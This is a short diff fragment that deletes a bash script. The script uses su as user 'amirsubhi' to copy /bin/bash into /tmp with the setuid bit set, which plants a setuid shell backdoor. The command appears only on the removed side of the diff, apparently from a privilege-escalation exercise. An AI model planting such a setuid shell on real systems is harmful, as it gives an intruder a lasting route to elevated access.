@@ -1,3 +1,0 @@
-#!/usr/bin/bash
-
-su -c "cp /bin/bash /tmp && chmod 4755 /tmp/bash" -s /bin/bash amirsubhi
